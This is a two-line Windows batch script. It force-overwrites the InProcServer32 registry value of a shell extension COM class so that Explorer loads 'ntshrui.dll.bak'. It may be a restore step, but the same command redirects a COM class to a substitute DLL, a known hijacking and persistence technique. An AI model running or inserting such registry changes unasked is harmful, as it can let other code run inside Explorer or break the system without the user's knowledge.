@echo off
REG ADD HKEY_CLASSES_ROOT\clsid\{f81e9010-6ea4-11ce-a7ff-00aa003ca9f6}\InProcServer32 /ve /t REG_SZ /d ntshrui.dll.bak /f